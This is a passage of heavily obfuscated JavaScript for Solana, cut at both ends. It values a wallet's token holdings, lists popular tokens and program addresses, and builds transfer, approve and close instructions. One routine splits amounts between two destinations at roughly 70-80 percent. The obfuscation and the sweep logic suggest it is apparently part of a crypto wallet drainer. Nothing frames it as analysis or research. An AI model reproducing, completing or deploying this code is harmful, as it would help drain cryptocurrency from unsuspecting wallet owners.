        _s5 ? _s3["_e"] = _s5 : __str_table__["set"](_s2, _s3["de"])
      }
      if (_s3["oe"] === 0) {
        let _s5 = _v452["get"](_s2);
        if (_s5) {
          let _s4 = Number(_s3["ve"]) / 10 ** _s3["g"];
          _s3["oe"] = _s4 * _s5
        } else {
          _s1["add"](_s2)
        }
      }
    }
    let _s6 = __str_table__["size"] > 0 ? await solana[getString(317)]([...__str_table__["values"]()], {
      ["encoding"]: "base64"
    })["catch"](() => {
      return "null"
    }) : "null";
    let _s7 = [...__str_table__["keys"]()];
    let _s8 = _s6?.value || [];
    let _defineProperty = _s1["size"] > 0 ? await _v710["cr"]([..._s1]["slice"](0, 200))["catch"](() => {
      return "null"
    }) : "null";
    for (let _s3 of _str_cache) {
      let _s2 = _s3["q"];
      let _s5 = _s7["indexOf"](_s2);
      if (_s5 != -1) {
        let _getOwnPropDesc = _s8[_s5]?.K;
        _getOwnPropDesc && (_s3["_e"] = _getOwnPropDesc, _v459["set"](_s2, _getOwnPropDesc))
      }
      let _s4 = _defineProperty?.get(_s2);
      if (_s4) {
        let [_getOwnPropDesc, _found] = _s4;
        let _v1 = Number(_s3["ve"]) / 10 ** _s3["g"] * _getOwnPropDesc;
        let _v2 = 2 * (_v1 / _found);
        if (_v2 > 0.5) {
          continue
        }
        let _v5 = _v1 * (1 - _v2);
        _noop(_v452["set"](_s2, _getOwnPropDesc), _s3["oe"] = _v5)
      }
    }
  }
  async ["Eo"](_str_cache) {
    let __str_table__ = _v460["get"](_str_cache);
    if (__str_table__) {
      return __str_table__
    }
    let _s1 = await this["gr"](_str_cache);
    if (!_s1) {
      return
    }
    let _s3 = Uint8Array["fromBase64"](_s1["data"][0]);
    let _s2 = _s3[44];
    let _s5 = _v916(_s3);
    let _s4 = "null";
    let _s6 = "null";
    if (_s5) {
      let _s7 = await _v1242(_s5);
      _noop(_s4 = _s7["Nt"], _s6 = _s7["Ot"])
    }
    let _s8 = {
      ["q"]: _str_cache,
      ["g"]: _s2,
      ["Nt"]: _s4,
      ["Ot"]: _s6
    };
    return _v460["set"](_str_cache, _s8), _s8
  }
}, _v338 = new _v718, _v461 = new(Set)(["Request approval for transactions", "Perform transactions without confirmation", getString(234), getString(320), getString(321), getString(322), getString(170), getString(313), getString(312), getString(314), getString(323), "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb", getString(169), getString(248), getString(249), getString(250), getString(251), getString(252), getString(253), getString(254), getString(255), getString(256), getString(257), getString(258), getString(259), getString(260), getString(261), getString(262), getString(263), getString(264), getString(265), getString(266), getString(267), getString(268), getString(269), getString(270), getString(271), getString(272), getString(273), getString(274), getString(275), getString(276), getString(325), getString(326), getString(327), getString(328), getString(329), getString(330), getString(331), getString(332), getString(333), getString(334), getString(335), getString(336), getString(337), getString(338), getString(339), getString(340), getString(341), getString(342), getString(343), getString(344), getString(345), getString(346)]), _v462 = {
  ["DyQegQBffA8GJ5NMiqVo8LC6LDSYtxbQVbie2GbisMht"]: [..._v461]
}, _v339 = {
  ["USDC"]: getString(325),
  ["USDT"]: getString(326),
  ["SOL"]: getString(327),
  ["JUP"]: getString(328),
  ["PUMP"]: getString(329),
  ["WBTC"]: getString(330),
  ["ETH"]: getString(331),
  ["ASTER"]: getString(332),
  ["PENGU"]: getString(333),
  ["Bonk"]: getString(334),
  ["RAY"]: getString(335),
  ["Fartcoin"]: getString(336),
  ["JitoSOL"]: getString(337),
  ["TRUMP"]: getString(338),
  ["$WIF"]: getString(339),
  ["mSOL"]: getString(340),
  ["MET"]: getString(341),
  ["DADDY"]: getString(342),
  ["WhiteWhale"]: getString(343),
  ["Buttcoin"]: getString(344),
  ["ZEC"]: getString(345),
  ["ZCAT"]: getString(346)
}, _v340 = getString(323), _v341 = getString(321), _v719 = getString(322));

function _v1243(_str_cache, __str_table__, _s1, _s3) {
  let _s2 = new(Uint8Array)(12);
  _noop(_s2[0] = 4, _v86(_s2, BigInt(_s3), 4));
  let _s5 = [{
    ["e"]: __str_table__,
    ["r"]: 1
  }, {
    ["e"]: _s1,
    ["r"]: 1
  }, {
    ["e"]: _v341,
    ["r"]: 0
  }, {
    ["e"]: _v719,
    ["r"]: 0
  }, {
    ["e"]: _str_cache,
    ["r"]: 2
  }];
  return {
    ["d"]: _v340,
    ["data"]: _s2,
    ["f"]: _s5,
    ["v"]: 10000
  }
}
_noop(_v134 = _v150, _v720 = getString(320));

function _v558(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2 = {
    ["\u624A"]: {}
  }) {
    while (_s1 + _s3 !== 53) {
      with(_s2["\u7BF9"] || _s2) {
        switch (_s1 + _s3) {
          case 78:
          case _s1 - 197:
            _noop(_s2["\u7BF9"] = _s2["\u94E8"], _s1 += -532, _s3 += 204);
            break;
          case _s1 != -22 && _s1 != 139 && _s1 != -235 && _s1 - -79:
          default:
            _noop([_s2["\u624A"]["\u92C8"]] = [6], _str_cache["a"] = new(_g(CONSTS[_s1 + 229] + CONSTS[_s1 + 57]))()[CONSTS[_s1 + 121]](_str_cache[0]));
            for (let _s5 of _str_cache[CONSTS[_s1 + -91]]) {
              if (_s5 > 126) {
                throw new(Error)(getString(_s1 + 242))
              }
            }
            _str_cache[-CONSTS[_s1 + 143]] = new(Uint8Array)(1 + _str_cache["a"]["length"]);
            return __str_table__ = true, _str_cache[-224][CONSTS[_s1 + 98]](_str_cache["a"], CONSTS[_s1 + -102]), {
              ["data"]: _str_cache[-224],
              ["d"]: _v134,
              [CONSTS[_s1 + 607]]: 150
            };
            _noop(_s2["\u7BF9"] = _s2["\u5AE0"], _s1 += -247, _s3 += 115);
            break;
            if (_s1 > -158) {
              _noop(_s2["\u7BF9"] = _s2["\u77B9"], _s1 += -247, _s3 += 115);
              break
            }
          case _s1 != 139 && _s1 != -235 && _s1 != 106 && _s1 - -79:
          case -3:
          case -83:
          case -151:
            _noop([_s2["\u624A"]["\u92C8"]] = [-91], _str_cache[CONSTS[_s1 + 173]] = new(_g("OaGlXx" + CONSTS[_s1 + 321]))()[CONSTS[_s1 + 385]](_str_cache[0]));
            for (let _s5 of _str_cache[CONSTS[_s1 + 173]]) {
              if (_s5 > 126) {
                throw new(_g(CONSTS[_s1 + 365] + CONSTS[_s1 + 317]))("CihJh7tXAEjg4QXFLT8TMvuny4MaWVDLynsoTdomEN3s")
              }
            }
            _str_cache[-CONSTS[_s1 + 407]] = new(_g("UItOUF" + CONSTS[_s1 + 331]))(1 + _str_cache["a"]["length"]);
            return __str_table__ = true, _str_cache[-CONSTS[_s1 + 407]][CONSTS[_s1 + 362]](_str_cache[CONSTS[_s1 + 173]], 1), {
              [CONSTS[_s1 + 541]]: _str_cache[-224],
              ["d"]: _v134,
              ["v"]: 150
            };
            _noop(_s1 += 17, _s3 += 187);
            break;
            if (_s1 > -158) {
              _noop(_s1 += 17, _s3 += 187);
              break
            }
          case _s3 - -139:
            _noop(_s2["\u7BF9"] = _s2["\u7738"], _s1 += -297, _s3 += -72);
            break;
          case 125:
          case _s2["\u624A"]["\u92C8"] + -65:
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-158, 7)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _v914(..._str_cache) {
  return {
    ["d"]: _v134,
    ["data"]: new(Uint8Array)([2]),
    ["v"]: 150,
    ["f"]: [{
      ["e"]: _str_cache[0],
      ["r"]: 2
    }]
  }
}

function _v913(..._str_cache) {
  return {
    ["d"]: _v134,
    ["data"]: new(Uint8Array)([3]),
    ["f"]: [{
      ["e"]: _str_cache[0],
      ["r"]: 3
    }, {
      ["e"]: _v74,
      ["r"]: 0
    }],
    ["v"]: 1400,
    ["ae"]: 1
  }
}

function _v912(..._str_cache) {
  return {
    ["d"]: _v134,
    ["data"]: new(Uint8Array)([4]),
    ["f"]: [{
      ["e"]: _str_cache[1],
      ["r"]: 1
    }, {
      ["e"]: _v341,
      ["r"]: 0
    }, {
      ["e"]: _str_cache[0],
      ["r"]: 2
    }, {
      ["e"]: _str_cache[2],
      ["r"]: 2
    }, {
      ["e"]: _v340,
      ["r"]: 0
    }],
    ["v"]: 40000,
    ["ae"]: 3
  }
}

function _v1045(_str_cache, __str_table__, _s1, _s3, _s2) {
  let _s5 = new(Uint8Array)(9);
  return _s5[0] = 14, _s3 = Math["min"](Math["trunc"](_s3), 1e14), _v86(_s5, BigInt(_s3), 1), {
    ["d"]: _v134,
    ["data"]: _s5,
    ["f"]: [{
      ["e"]: _str_cache,
      ["r"]: 3
    }, {
      ["e"]: _s2,
      ["r"]: 1
    }, {
      ["e"]: _s1,
      ["r"]: 1
    }, {
      ["e"]: __str_table__,
      ["r"]: 0
    }, {
      ["e"]: _v720,
      ["r"]: 0
    }, {
      ["e"]: _v69,
      ["r"]: 0
    }, {
      ["e"]: _v74,
      ["r"]: 0
    }],
    ["v"]: 20000,
    ["ae"]: 3
  }
}
_v721 = _v150;

function _v911(..._str_cache) {
  return {
    ["d"]: _v721,
    ["data"]: new(Uint8Array)([18]),
    ["f"]: [{
      ["e"]: _str_cache[0],
      ["r"]: 0
    }, {
      ["e"]: _str_cache[2],
      ["r"]: 1
    }, {
      ["e"]: _v341,
      ["r"]: 0
    }, {
      ["e"]: _str_cache[1],
      ["r"]: 2
    }, {
      ["e"]: _str_cache[3],
      ["r"]: 2
    }, {
      ["e"]: _v340,
      ["r"]: 0
    }],
    ["v"]: 40000,
    ["ae"]: 3
  }
}

function _v1244(_str_cache, __str_table__, _s1) {
  let _s3 = _v923(_str_cache * BigInt(__str_table__), 10000n);
  return _s1 && _s3 > _s1 ? _s1 : _s3
}

function _v910(..._str_cache) {
  _noop(_str_cache[47] = new(Uint8Array)(19), _str_cache[47][0] = 26, _str_cache[47][1] = 1, _str_cache[47][10] = _str_cache[4]["g"], _v86(_str_cache[47], _str_cache[3], 2), _str_cache["b"] = _v1244(_str_cache[3], _str_cache[4]["Ot"] ?? 0, _str_cache[4]["Nt"]), _v86(_str_cache[47], _str_cache["b"], 11), _str_cache[7] = [{
    ["e"]: _str_cache[1],
    ["r"]: 1
  }, {
    ["e"]: _str_cache[4]["q"],
    ["r"]: 0
  }, {
    ["e"]: _str_cache[2],
    ["r"]: 1
  }, {
    ["e"]: _str_cache[0],
    ["r"]: 2
  }]);
  return {
    ["d"]: _v69,
    ["data"]: _str_cache[47],
    ["f"]: _str_cache[7],
    ["v"]: 5000
  }
}

function _v909(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2 = {
    ["\u901C"]: {}
  }) {
    while (_s1 + _s3 !== -209) {
      with(_s2["\u683E"] || _s2) {
        switch (_s1 + _s3) {
          case _s2["\u901C"]["\u7324"] + -149:
            _noop(_s2["\u683E"] = _s2["\u519E"], _s1 += 121, _s3 += -348);
            break;
          case 236:
          case -88:
          case 171:
            _noop(_s2["\u683E"] = _s2["\u5EDD"], _s1 += 541, _s3 += -662);
            break;
          case _s3 - 357:
            _noop([_s2["\u901C"]["\u7324"]] = [167], [_str_cache["a"], _str_cache["b"]] = _str_cache[CONSTS[_s1 + 357]], _str_cache[-CONSTS[_s1 + 387]] = _v290(_str_cache[CONSTS[_s1 + 376]], 70, CONSTS[_s1 + 1073]) / 100, _str_cache[7] = Math["floor"](_str_cache[CONSTS[_s1 + 358]] * _str_cache[-CONSTS[_s1 + 387]]), _str_cache["e"] = _str_cache[CONSTS[_s1 + 358]] - _str_cache[7]);
            return __str_table__ = true, _str_cache[7] <= CONSTS[_s1 + 1164] ? [_v99(_str_cache[CONSTS[_s1 + 363]], _str_cache[1], _str_cache["e"] + _str_cache[7])] : [_v99(_str_cache[CONSTS[_s1 + 363]], _str_cache[CONSTS[_s1 + 372]], _str_cache[CONSTS[_s1 + 382]]), _v99(_str_cache[CONSTS[_s1 + 363]], _str_cache[1], _str_cache[CONSTS[_s1 + 512]])];
            _noop(_s1 += 387, _s3 += -360);
            break;
          case -189:
            _noop(_s2["\u683E"] = _s2["\u901C"], _s1 += 269, _s3 += 101);
            break;
          case 181:
            _noop(_s2["\u683E"] = _s2["\u7EE8"], _s1 += -115, _s3 += -302);
            break;
            if (_s3 < 423) {
              _noop(_s2["\u683E"] = _s2["\u901C"], _s1 += 151, _s3 += -344);
              break
            }
          case _s1 != -91 && _s1 - -109:
          case -231:
            _noop(_s2["\u683E"] = _s2["\u90E3"], _s1 += 72, _s3 += -348);
            break;
          case _s1 - -79:
          case 144:
          case 135:
            _noop(_s2["\u683E"] = _s2["\u8A10"], _s1 += -266, _s3 += 42);
            break;
            if (_s1 != -91) {
              _noop(_s2["\u683E"] = _s2["\u901C"], _s1 += -420, _s3 += 243);
              break
            }
          case _s1 - -235:
            _noop([_s2["\u901C"]["\u7324"]] = [102], [_str_cache["a"], _str_cache["b"]] = _str_cache[CONSTS[_s1 + 433]], _str_cache[-47] = _v290(_str_cache["b"], 70, 80) / 100, _str_cache[7] = Math["floor"](_str_cache[3] * _str_cache[-47]), _str_cache[CONSTS[_s1 + 588]] = _str_cache[3] - _str_cache[7]);
            return __str_table__ = true, _str_cache[7] <= CONSTS[_s1 + 1240] ? [_v99(_str_cache[0], _str_cache[1], _str_cache["e"] + _str_cache[7])] : [_v99(_str_cache[0], _str_cache["a"], _str_cache[7]), _v99(_str_cache[0], _str_cache[1], _str_cache["e"])];
            _noop(_s2["\u683E"] = _s2["\u7898"], _s1 += 463, _s3 += -474);
            break;
          default:
            _noop([_str_cache["a"], _str_cache[CONSTS[_s1 + 110]]] = _str_cache[2], _str_cache[-CONSTS[_s1 + 121]] = _v290(_str_cache["b"], 70, 80) / 100, _str_cache[7] = Math["floor"](_str_cache[CONSTS[_s1 + 92]] * _str_cache[-CONSTS[_s1 + 121]]), _str_cache["e"] = _str_cache[CONSTS[_s1 + 92]] - _str_cache[CONSTS[_s1 + 116]]);
            return __str_table__ = true, _str_cache[CONSTS[_s1 + 116]] <= 650240 ? [_v99(_str_cache[0], _str_cache[CONSTS[_s1 + 95]], _str_cache[CONSTS[_s1 + 246]] + _str_cache[7])] : [_v99(_str_cache[0], _str_cache["a"], _str_cache[7]), _v99(_str_cache[0], _str_cache[CONSTS[_s1 + 95]], _str_cache["e"])];
            _noop(_s2["\u683E"] = _s2["\u8E49"], _s1 += 121, _s3 += -274);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-357, 121)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}
_v342 = "7rMxsMRS28BhJMEM2PbecQZ13akfpyjsVtcXnhzwZ391";

function _v286(..._str_cache) {
  _str_cache[-132] = new(Uint8Array)(5);
  return _str_cache[-132][0] = 2, _v223(_str_cache[-132], _str_cache[0], 1), {
    ["d"]: _v342,
    ["data"]: _str_cache[-132],
    ["v"]: 150
  }
}

function _v285(..._str_cache) {
  _str_cache[1] = new(Uint8Array)(9);
  return _str_cache[1][0] = 3, _v86(_str_cache[1], _str_cache[0], 1), {
    ["d"]: _v342,
    ["data"]: _str_cache[1],
    ["v"]: 150
  }
}
_v722 = _v150;

function _v557(..._str_cache) {
  _str_cache[96] = new(Uint8Array)(9);
  return _str_cache[96][0] = 10, _str_cache[96]["set"](_v560(_buildList(_str_cache[1])), 1), {
    ["d"]: _v722,
    ["data"]: _str_cache[96],
    ["f"]: [{
      ["e"]: _str_cache[0],
      ["r"]: 1
    }, {
      ["e"]: _str_cache[1],
      ["r"]: 3
    }],
    ["v"]: 200
  }
}
_v124 = _v150;

function _v556(..._str_cache) {
  _noop({
    ["E"]: _str_cache["a"],
    ["to"]: _str_cache[2],
    ["ce"]: _str_cache["c"]
  } = _str_cache[0], _str_cache["d"] = 150, _str_cache[229] = 1, _str_cache[189] = 0, _str_cache[218] = [{
    ["e"]: _str_cache["a"],
    ["r"]: 3
  }, {
    ["e"]: _str_cache[2],
    ["r"]: 1
  }], _str_cache[0]["Pe"] && (_str_cache[189] += 4, _str_cache[218]["push"]({
    ["e"]: _str_cache[0]["Pe"],
    ["r"]: 0
  })), _str_cache["c"] && (_str_cache[189] += 2, _str_cache["d"] += 150, _str_cache[229] += 1, _str_cache[218]["push"]({
    ["e"]: _str_cache["c"][0],
    ["r"]: 1
  })), _str_cache[0]["Cn"] && (_str_cache[189] += 1, _str_cache["d"] += 1400, _str_cache[229] += 1), _str_cache["h"] = [21, _str_cache[189]]);
  return _str_cache["c"] && _str_cache["h"]["push"](_str_cache["c"][1]), _str_cache[218]["push"]({
    ["e"]: _v74,
    ["r"]: 0
  }), {
    ["d"]: _v124,
    ["f"]: _str_cache[218],
    ["data"]: new(Uint8Array)(_str_cache["h"]),
    ["v"]: _str_cache["d"],
    ["ae"]: _str_cache[229]
  }
}

function _v392(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5, _s4 = {
    ["\u6867"]: {}
  }) {
    while (_s1 + _s3 + _s2 + _s5 !== -21) {
      with(_s4["\u82B8"] || _s4) {
        switch (_s1 + _s3 + _s2 + _s5) {
          case _s4["\u6867"]["\u903B"] + -317:
            _str_cache[202] = [19, _str_cache["i"]];
            return __str_table__ = true, _str_cache[94] && _str_cache[202]["push"](_str_cache[94][1]), {
              ["d"]: _v124,
              ["f"]: _str_cache[10],
              ["data"]: new(_g(CONSTS[_s1 + -62] + "E"))(_str_cache[202]),
              ["v"]: _str_cache["g"],
              ["ae"]: _str_cache["h"]
            };
            _noop(_s4["\u82B8"] = _s4["\u5159"], _s1 += -517, _s3 += -241, _s2 += 1233, _s5 += -301);
            break;
            if (_s3 == -131) {
              _noop(_s4["\u82B8"] = _s4["\u6867"], _s3 += -241, _s2 += 799, _s5 += -301);
              break
            }
          case 62:
            _noop(_s4["\u82B8"] = _s4["\u6867"], _s1 += -153, _s3 += -600, _s2 += 135, _s5 += 409);
            break;
          case 77:
          case -20:
          case _s3 - 116:
            _noop([_s4["\u6867"]["\u55A3"], _s4["\u6867"]["\u903B"], _s4["\u6867"]["\u7F10"]] = [100, 198, -200], _s4["\u82B8"] = _s4["\u6867"], _s1 += -153, _s3 += -841, _s2 += 745, _s5 += 108);
            break;
          case -118:
          case _s1 - 81:
            _str_cache[202] = [19, _str_cache["i"]];
            return __str_table__ = true, _str_cache[94] && _str_cache[202]["push"](_str_cache[CONSTS[_s2 + 602]][1]), {
              ["d"]: _v124,
              ["f"]: _str_cache[10],
              ["data"]: new(Uint8Array)(_str_cache[202]),
              [CONSTS[_s3 + 751]]: _str_cache["g"],
              ["ae"]: _str_cache["h"]
            };
            _noop(_s4["\u82B8"] = _s4["\u7651"], _s1 += -104, _s3 += -93, _s2 += 299, _s5 += 87);
            break;
            if (_s3 == -131) {
              _noop(_s4["\u82B8"] = _s4["\u6867"], _s1 += 413, _s3 += -93, _s2 += -135, _s5 += 87);
              break
            }
          case -81:
          case 194:
          case -214:
            _noop([_s4["\u6867"]["\u55A3"], _s4["\u6867"]["\u903B"], _s4["\u6867"]["\u7F10"]] = [-16, 122, -48], {
              ["gt"]: _str_cache[-33],
              [CONSTS[_s2 + 1289]]: _str_cache[-CONSTS[_s1 + 102]],
              ["Gt"]: _str_cache[CONSTS[_s2 + 474]],
              ["ce"]: _str_cache[94]
            } = _str_cache[0], _str_cache["e"] = _str_cache[-CONSTS[_s3 + 76]][CONSTS[_s3 + 588]] ? CONSTS[_s3 + 703] : CONSTS[_s3 + 613], _str_cache[CONSTS[_s3 + -95]] = _str_cache[-CONSTS[_s1 + 102]][CONSTS[_s3 + 588]] ? 3100 : 120, _s4["\u82B8"] = _s4["\u6867"], _s1 += 54, _s3 += -834, _s2 += 684, _s5 += 163);
            break;
            if (!(_s5 != _s3 + 55)) {
              _noop(_s1 += -310, _s3 += -234, _s2 += 983, _s5 += -246);
              break
            }
          case 39:
          default:
          case -147:
            _noop(_str_cache["g"] = _str_cache["e"], _str_cache[CONSTS[_s1 + 82]] = 1, _s4["\u82B8"] = _s4["\u6867"], _s1 += -439, _s3 += 789);
            break;
          case -247:
          case 157:
          case 203:
            _noop(_str_cache["i"] = CONSTS[_s1 + 314], _str_cache[10] = [{
              ["e"]: _str_cache[-78]["J"] ? _v69 : _v75,
              ["r"]: 0
            }, {
              ["e"]: _str_cache[-78][CONSTS[_s1 + 972]],
              ["r"]: 1
            }, {
              [CONSTS[_s2 + -56]]: _str_cache[3],
              ["r"]: 1
            }, {
              ["e"]: _str_cache[-33],
              ["r"]: 2
            }], _str_cache[CONSTS[_s3 + -52]][CONSTS[_s2 + 598]] && (_str_cache["i"] += CONSTS[_s1 + 318], _str_cache[10][CONSTS[_s3 + -31]]({
              [CONSTS[_s2 + -56]]: _str_cache[0]["Pe"],
              ["r"]: CONSTS[_s1 + 314]
            })), _str_cache[94] && (_str_cache[CONSTS[_s2 + 344]] += 2, _str_cache[CONSTS[_s2 + 19]] += _str_cache["e"], _str_cache["g"] += 1500, _str_cache["h"] += 1, _str_cache[10]["push"]({
              ["e"]: _str_cache[CONSTS[_s3 + 755]][CONSTS[_s2 + -205]],
              [CONSTS[_s2 + 112]]: 1
            })), _str_cache[-CONSTS[_s3 + 121]]["J"] && (_str_cache["g"] += _s2 + 1089, _str_cache[CONSTS[_s1 + 521]] += 1, _str_cache[10][CONSTS[_s3 + -31]]({
              ["e"]: _str_cache[-78]["q"],
              [CONSTS[_s1 + 631]]: 1
            })), _str_cache[0]["vt"] && (_str_cache[CONSTS[_s1 + 863]] += CONSTS[_s1 + 312], _str_cache["g"] += _str_cache[6], _str_cache["h"] += 1, _str_cache[10]["push"]({
              ["e"]: _str_cache[0]["vt"],
              ["r"]: 1
            })), _str_cache[0]["$t"] && (_str_cache[CONSTS[_s1 + 863]] += 4, _str_cache["g"] += 1000, _str_cache[CONSTS[_s1 + 521]] += 1, _str_cache[10]["push"]({
              ["e"]: _str_cache[CONSTS[_s1 + 314]]["$t"],
              [CONSTS[_s3 + 265]]: 0
            })), _s4["\u82B8"] = _s4["\u6867"], _s1 += 179, _s3 += -96, _s5 += -496);
            break;
          case 54:
          case _s4["\u6867"]["\u903B"] + -243:
            _noop([_s4["\u6867"]["\u55A3"], _s4["\u6867"]["\u903B"], _s4["\u6867"]["\u7F10"]] = [13, -83, -139], _s4["\u82B8"] = _s4["\u6867"], _s1 += 352, _s3 += -841, _s2 += 355, _s5 += 108);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(77, 103, -473, 79)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _v1245(_str_cache, __str_table__, _s1, _s3) {
  if (!__str_table__) {
    __str_table__ = function*(__str_table__, _s3, _s2 = {
      ["_v417"]: {}
    }) {
      while (__str_table__ + _s3 !== -131) {
        with(_s2["\u9E3D"] || _s2) {
          switch (__str_table__ + _s3) {
            case _s3 - -23:
              _noop([_s2["_v417"]["\u7EC1"]] = [228], _v417["_v1429"] = _str_cache[CONSTS[__str_table__ + 793]], _v417["_v1046"] = 0, _v417["_v1246"] = [{
                [CONSTS[__str_table__ + 132]]: _v417["_v1429"][CONSTS[__str_table__ + 668]] ? _v69 : _v75,
                [CONSTS[__str_table__ + 300]]: 0
              }, {
                ["e"]: _v417["_v1429"][CONSTS[__str_table__ + 641]],
                [CONSTS[__str_table__ + 300]]: 1
              }, {
                [CONSTS[__str_table__ + 132]]: _str_cache[CONSTS[__str_table__ + 794]],
                ["r"]: CONSTS[__str_table__ + -23]
              }, {
                ["e"]: _str_cache["Ln"],
                ["r"]: 0
              }], _s2["\u9E3D"] = _s2["_v417"], __str_table__ += -89, _s3 += -85);
              break;
            default:
              _noop([_s2["_v417"]["\u7EC1"]] = [232], _s2["\u9E3D"] = _s2["_v417"], __str_table__ += -1, _s3 += 67);
              break;
            case _s3 - 66:
              return _s1 = true, _str_cache["$t"] && (_v1046 += CONSTS[__str_table__ + 70]), _str_cache["Pe"] && (_v1046 += CONSTS[__str_table__ + 66], _v1246["push"]({
                ["e"]: _str_cache[CONSTS[__str_table__ + 875]],
                ["r"]: CONSTS[__str_table__ + 72]
              })), {
                [CONSTS[__str_table__ + 84]]: _v124,
                [CONSTS[__str_table__ + 299]]: _v1246,
                [CONSTS[__str_table__ + 449]]: new(_g(CONSTS[__str_table__ + 288] + CONSTS[__str_table__ + 239]))([22, _v1046]),
                ["v"]: _v1429[CONSTS[__str_table__ + 757]] ? 1900 : 1000,
                ["ae"]: 1
              };
              _noop(_s2["\u9E3D"] = _s2["\u5102"], __str_table__ += 127, _s3 += -225);
              break;
            case 110:
            case -21:
              _noop(_s2["\u9E3D"] = _s2["\u9774"], __str_table__ += 78, _s3 += 84);
              break;
              if (__str_table__ > -(__str_table__ + 110)) {
                _noop(_s2["\u9E3D"] = _s2["\u92D0"], __str_table__ += 78, _s3 += 84);
                break
              }
            case _s3 - 21:
            case 145:
              _noop(_s2["\u9E3D"] = _s2["\u5DC2"], __str_table__ += 44, _s3 += 17);
              break
          }
        }
      }
    }
  }
  _noop(_s1 = undefined, _s3 = __str_table__(23, 118)["next"]()["value"]);
  if (_s1) {
    return _s3
  }
}

function _v555(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2 = {
    ["\u55C1"]: {}
  }) {
    while (_s1 + _s3 !== 146) {
      with(_s2["\u9929"] || _s2) {
        switch (_s1 + _s3) {
          case 200:
          case _s2["\u55C1"]["\u5B18"] + 75:
          case -162:
            _noop(_s2["\u9929"] = _s2["\u57DA"], _s1 += -51, _s3 += 274);
            break;
            if (!(_s1 != 236)) {
              _noop(_s2["\u9929"] = _s2["\u9D75"], _s1 += -51, _s3 += 274);
              break
            }
          case 112:
            _noop([_s2["\u55C1"]["\u5B18"], _s2["\u55C1"]["\u5E31"]] = [-152, 112], _str_cache[-CONSTS[_s1 + 132]] = _str_cache[2] ? _v69 : _v75, _str_cache[-CONSTS[_s1 + -193]] = [{
              [CONSTS[_s1 + -40]]: _str_cache[0],
              [CONSTS[_s1 + 128]]: 3
            }, {
              ["e"]: _str_cache[CONSTS[_s1 + -191]],
              [CONSTS[_s1 + 128]]: 0
            }, {
              [CONSTS[_s1 + -40]]: _str_cache[-76],
              ["r"]: CONSTS[_s1 + -189]
            }, {
              [CONSTS[_s1 + -40]]: _v74,
              ["r"]: CONSTS[_s1 + -189]
            }, {
              [CONSTS[_s1 + -40]]: _v187,
              [CONSTS[_s1 + 128]]: 0
            }], _s2["\u9929"] = _s2["\u55C1"], _s1 += -361, _s3 += 71);
            break;
          case _s1 != 113 && _s1 - 266:
            _noop([_s2["\u55C1"]["\u5B18"], _s2["\u55C1"]["\u5E31"]] = [-108, -219], _str_cache[-76] = _str_cache[CONSTS[_s1 + -172]] ? _v69 : _v75, _str_cache[-4] = [{
              ["e"]: _str_cache[0],
              ["r"]: 3
            }, {
              ["e"]: _str_cache[1],
              ["r"]: CONSTS[_s1 + -166]
            }, {
              ["e"]: _str_cache[-76],
              ["r"]: 0
            }, {
              ["e"]: _v74,
              ["r"]: 0
            }, {
              ["e"]: _v187,
              ["r"]: 0
            }], _s2["\u9929"] = _s2["\u55C1"], _s1 += -338, _s3 += 254);
            break;
          case -241:
          case 208:
            _noop(_s2["\u9929"] = _s2["\u7D9E"], _s1 += 113, _s3 += 274);
            break;
          case -178:
            for (let _s5 of _str_cache[CONSTS[_s1 + 167]]) {
              _str_cache[-4]["push"]({
                ["e"]: _s5[CONSTS[_s1 + 1034]],
                [CONSTS[_s1 + 489]]: 0
              }, {
                ["e"]: _s5[CONSTS[_s1 + 830]],
                ["r"]: 1
              })
            }
            _noop(_str_cache["c"] = CONSTS[_s1 + 984] * _str_cache[3][CONSTS[_s1 + 171]], _s2["\u9929"] = _s2["\u55C1"], _s1 += 187, _s3 += -130);
            break;
          case _s3 != -266 && _s3 - -172:
            _noop(_str_cache[-CONSTS[_s1 + 155]] = _str_cache[2] ? _v69 : _v75, _str_cache[-CONSTS[_s1 + -170]] = [{
              [CONSTS[_s1 + -17]]: _str_cache[0],
              ["r"]: 3
            }, {
              ["e"]: _str_cache[CONSTS[_s1 + -168]],
              ["r"]: CONSTS[_s1 + -166]
            }, {
              [CONSTS[_s1 + -17]]: _str_cache[-CONSTS[_s1 + 155]],
              ["r"]: CONSTS[_s1 + -166]
            }, {
              [CONSTS[_s1 + -17]]: _v74,
              ["r"]: 0
            }, {
              ["e"]: _v187,
              [CONSTS[_s1 + 151]]: 0
            }], _s2["\u9929"] = _s2["\u55C1"], _s1 += -338, _s3 += 404);
            break;
          case _s2["\u55C1"]["\u5E31"] + -233:
            _str_cache[-117] = CONSTS[_s1 + -18] * _str_cache[CONSTS[_s1 + -20]]["length"];
            return __str_table__ = true, {
              ["data"]: new(_g("UItOUF" + CONSTS[_s1 + 152]))([CONSTS[_s1 + 56]]),
              ["d"]: _v124,
              ["f"]: _str_cache[-4],
              ["v"]: _str_cache["c"],
              ["ae"]: _str_cache[-CONSTS[_s1 + 798]]
            };
            _noop(_s2["\u9929"] = _s2["\u57B3"], _s1 += 267);
            break;
          default:
          case _s3 - 264:
          case 231:
            if (_s1 == -101) {
              _noop(_s2["\u9929"] = _s2["\u55C1"], _s1 += 285, _s3 += -338);
              break
            }
          case _s1 != 172 && _s1 - 266:
            _noop([_s2["\u55C1"]["\u5B18"], _s2["\u55C1"]["\u5E31"]] = [60, 142], _s2["\u9929"] = _s2["\u72CA"], _s1 += 175, _s3 += 124);
            break;
            if (!(_s1 != 236)) {
              _noop(_s2["\u9929"] = _s2["\u686B"], _s1 += 175, _s3 += 124);
              break
            }
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(195, -83)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _v391(..._str_cache) {
  _str_cache[1] = 1;
  for (let __str_table__ of _str_cache[0]) {
